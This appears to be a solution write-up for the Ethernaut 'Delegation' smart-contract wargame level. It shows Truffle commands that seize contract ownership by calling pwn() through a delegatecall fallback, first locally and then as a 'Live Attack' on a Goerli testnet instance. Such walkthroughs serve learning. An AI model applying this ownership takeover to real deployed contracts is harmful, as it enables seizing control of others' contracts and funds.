# Delegation

[Delegation](https://ethernaut.openzeppelin.com/level/0xF781b45d11A37c51aabBa1197B61e6397aDf1f78)

_Claim ownership of the instance given._



## Test
```BASH
> truffle develop
```

```JS
migrate
d1 = await Delegate.deployed()
d2 = await Delegation.deployed()
d3 = await Delegate.at(d2.address)

sender = accounts[5]
await d3.pwn({from: sender})
await d2.owner()
```

<BR />

## Live Attack
```BASH
truffle console --network goerli
```

```JS
d2 = await Delegation.at('0x115b0b955937EC808b9C4030868F15225A910B3A')
d3 = await Delegate.at('0x115b0b955937EC808b9C4030868F15225A910B3A')

// Make sure to get 0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18
sender = accounts[5]
await d3.pwn({from: sender})
await d2.owner()
```